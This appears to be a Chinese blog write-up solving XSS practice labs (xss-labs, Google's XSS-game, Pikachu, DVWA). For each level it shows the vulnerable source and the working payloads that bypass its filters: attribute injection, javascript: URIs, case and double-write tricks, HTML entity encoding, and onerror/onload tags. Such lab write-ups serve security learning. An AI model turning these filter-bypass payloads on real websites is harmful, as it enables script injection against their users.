+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>需要绕过htmlspecialchars</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="onclick中使用javascript"><a href="#onclick中使用javascript" class="headerlink" title="onclick中使用javascript"></a>onclick中使用javascript</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用js事件的onclick</span><br><span class="line">onclick&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;sad&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="href中使用javascript"><a href="#href中使用javascript" class="headerlink" title="href中使用javascript"></a>href中使用javascript</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;xxx&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>没有做大小写过滤</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>发现只替换了一次，可以双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scripscriptt&gt;alert(1)&lt;&#x2F;scripscriptt&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>考察：字符的html实体构造方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(1)</span><br></pre></td></tr></table></figure>
+<h3 id="字符的html实体构造方法"><a href="#字符的html实体构造方法" class="headerlink" title="字符的html实体构造方法"></a>字符的html实体构造方法</h3><p>&amp;#+ascii码+;</p>
+<p>如，表示s，用&amp;#115;（不要忘记分号）</p>
+<p>即使js过滤了标签，后端接受到内容，依然会进行解码操作</p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>错误尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&amp;#34;&amp;#62;&amp;#60;java&amp;#115;cript&amp;#62;alert(1)&amp;#60;&#x2F;java&amp;#115;cript&amp;#62;&amp;#60;</span><br></pre></td></tr></table></figure>
+<p>正确payload</p>
+<p>把http://注释掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;hi</span><br></pre></td></tr></table></figure>
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>观察源码，需要通过get传递keyword和t_sort参数，其中t_sort为xss参数</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort&#x3D;333&quot; onclick&#x3D;alert(1) type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot; 333&quot; onclick&#x3D;alert(1) type&#x3D;&quot;text &quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line"># 下面是onclick在type后，但是不能alert</span><br><span class="line">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&quot; type&#x3D;text οnclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>这里一定要onclick在type的定义前，具体原因未知</p>
+<h1 id="XSS-game"><a href="#XSS-game" class="headerlink" title="XSS-game"></a>XSS-game</h1><p>地址：<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>直接在输入框输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>尝试level1源码，不行，留言板为空</p>
+<p>注意到fuzz测试中没有过滤任何字符</p>
+<p>尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;&quot;alert(1)&quot;&gt;2123&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>注意到没有地方输入，只有URL随着图片切换进行变化</p>
+<p>改变URL为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level3&#x2F;frame#&#39; onclick&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?timer&#x3D;3</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;div&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;div&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>但输入框有长度限制</p>
+<p>有两种方法</p>
+<p>方法一，修改html中的最大长度限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input class&#x3D;&quot;xssr_in&quot; type&#x3D;&quot;text&quot; maxlength&#x3D;&quot;20&quot; name&#x3D;&quot;message&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>方法2，发现参数通过URL以get方式提交，故直接在URL处对参数进行赋值</p>
+<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>没啥区别，用admin/123456登录进去，在输入框输入xss语句即可</p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>还是一样的</p>
+<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>进入源码，关键段为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;domxss()&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>因此本题考察onclick时，怎么调用javascript</p>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p>代码中有提示，注意闭合语句即可</p>
+<p>payload1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>payload2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>由于输入的表单过去后，直接呈现在页面的<td>标签中，而<td>标签中可以执行javascript，因此直接输入以下语句即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>测试哪些字符被转码，输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&quot;&lt;&gt;6666   </span><br></pre></td></tr></table></figure>
+<p>查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p class&#x3D;&#39;notice&#39;&gt;你的输入已经被记录:&lt;&#x2F;p&gt;&lt;a href&#x3D;&#39;&#39;&quot;&lt;&gt;6666&#39;&gt;&#39;&quot;&lt;&gt;6666&lt;&#x2F;a&gt;            &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+<p>故单引号可以输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;&#39;alert(1)&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="XSS的fuzz字典（针对htmlspecialchars）"><a href="#XSS的fuzz字典（针对htmlspecialchars）" class="headerlink" title="XSS的fuzz字典（针对htmlspecialchars）"></a>XSS的fuzz字典（针对htmlspecialchars）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&quot;&lt;&gt;()6666   </span><br></pre></td></tr></table></figure>
+<h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>输入james，可以看到返回的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;james&#39;;</span><br><span class="line">	echo $ms;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在中间插入js代码的方式</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>
+<p>代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;&#39;&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;&#39;;</span><br><span class="line">	echo $ms;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="DWVA"><a href="#DWVA" class="headerlink" title="DWVA"></a>DWVA</h1><h2 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>在URL处进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="median"><a href="#median" class="headerlink" title="median"></a>median</h3><p>选择English，查看返回源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">			document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">		&#125;</span><br><span class="line">		    </span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>闭合<option>和<select></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">English#&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="median-1"><a href="#median-1" class="headerlink" title="median"></a>median</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>查看源码，对script进行了过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br></pre></td></tr></table></figure>
+<p>尝试编码绕过，失败</p>
+<p>尝试onclick触发，成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&quot; onclick&#x3D;&quot;alert(1)&quot;&gt;123&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<p>其他方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name:</span><br><span class="line">	1234</span><br><span class="line">Message:</span><br><span class="line">	&lt;a href&#x3D;&#39;&#39; onclick&#x3D;&#39;alert(1)&#39;&gt;123&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="median-2"><a href="#median-2" class="headerlink" title="median"></a>median</h3><p>尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Name:</span><br><span class="line">	123</span><br><span class="line">Message:</span><br><span class="line">	&#39;&quot;&lt;&gt;()script</span><br><span class="line">	</span><br><span class="line">返回</span><br><span class="line">Message:\&#39;\&quot;()script</span><br></pre></td></tr></table></figure>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>strip_tags()会去除字符串中的HTML、XML、PHP标签</p>
+<p>addslashes()返回预定义字符前，添加反斜杠</p>
+<p>故只能在Name处注入</p>
+<p>使用burp改包</p>
